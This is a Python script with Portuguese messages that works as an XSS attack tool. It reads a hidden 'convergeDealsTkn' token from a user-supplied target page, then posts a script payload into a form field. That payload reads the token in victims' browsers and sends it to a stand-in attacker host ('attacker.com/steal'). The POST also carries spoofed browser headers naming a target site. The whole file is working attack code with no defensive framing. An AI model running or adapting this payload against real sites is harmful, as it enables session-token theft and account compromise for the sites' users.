import requests
from bs4 import BeautifulSoup

def get_token_from_hidden_field(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Erro ao acessar a URL: {e}")
        return None

    soup = BeautifulSoup(response.text, 'html.parser')
    hidden_input = soup.find('input', {'type': 'hidden', 'id': 'convergeDealsTkn'})
    if hidden_input:
        return hidden_input['value']
    else:
        print("Campo de entrada oculto 'convergeDealsTkn' não encontrado.")
        return None

def inject_xss_payload(url):
    payload = """<script>
        var token = document.getElementById('convergeDealsTkn').value;
        fetch('http://attacker.com/steal?token=' + token, { method: 'GET' });
    </script>"""
    
    data = {
        'vulnerable_field': payload
    }

    # Adicionar cabeçalhos comuns
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://www.alvo.com/support/',
        'Origin': 'https://www.alvo.com',
    }

    try:
        response = requests.post(url, data=data, headers=headers)
        response.raise_for_status()
        print("Payload de XSS injetado com sucesso.")
    except requests.RequestException as e:
        print(f"Erro ao injetar o payload de XSS: {e}")

def main():
    target_url = input("Digite o URL do site alvo (ex: http://example.com/usersettings.php): ")
    token = get_token_from_hidden_field(target_url)
    if token:
        print(f"Token encontrado: {token}")
        inject_xss_payload(target_url)
    else:
        print("Nenhum token encontrado ou campo oculto não encontrado.")

if __name__ == "__main__":
    main()
